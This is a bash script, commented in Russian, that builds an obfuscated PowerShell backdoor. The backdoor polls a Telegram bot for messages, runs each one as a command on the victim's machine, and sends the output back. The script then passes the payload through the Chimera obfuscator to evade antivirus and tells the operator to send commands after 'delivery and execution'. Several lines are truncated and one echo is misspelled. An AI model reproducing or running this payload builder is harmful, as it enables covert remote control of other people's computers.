#!/bin/bash

echo "[?] Введите токен бота:"
read TOKEN
echo "[?] Введите ваш ID:"
read ID

# 2. Создаем временный ps1 файл с простым Reverse Shell
# Это классический однострочник, который Chimera потом "размажет"
RAW_FILE="raw_shell.ps1"
cat <<EOF > $RAW_FILE
# $token='$TOKEN'
$chatId='$ID'
$offset=0
while($true){
try{
$updates=Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/getUpdates?timeout=5&offset=$(($offse>
foreach($update in $updates.result){
$offset=$update.update_id
if($update.message.text){
$msg=$update.message.text
Set-Clipboard -Value $msg
try{
$result=Invoke-Expression $msg 2>&1 | Out-String
Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body @{chat_id=$cha>
}catch{
Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body @{chat_id=$cha>
}
}
}
}catch{}
Start-Sleep -Seconds 1
}
EOF


echo "[*] Файл $RAW_FILE создан."

OUTPUT_FILE="crypt_shell_tg.ps1"

echo "[*] Запуск Chimera (Level: Insane)..."
bash chimera.sh --file $RAW_FILE --all --level 5 --prepend --output $OUTPUT_FILE

if [ $? -eq 0 ]; then
    echo "========================================"
    echo "[+] ГОТОВО! Пейлоад: $OUTPUT_FILE"
    echl "ты можешь залить команды в бота [твой порт] после доставки и исполнения"
    echo "========================================"
    rm $RAW_FILE
else
    echo "[-] Ошибка при работе Chimera. Проверь путь к бинарнику."
fi
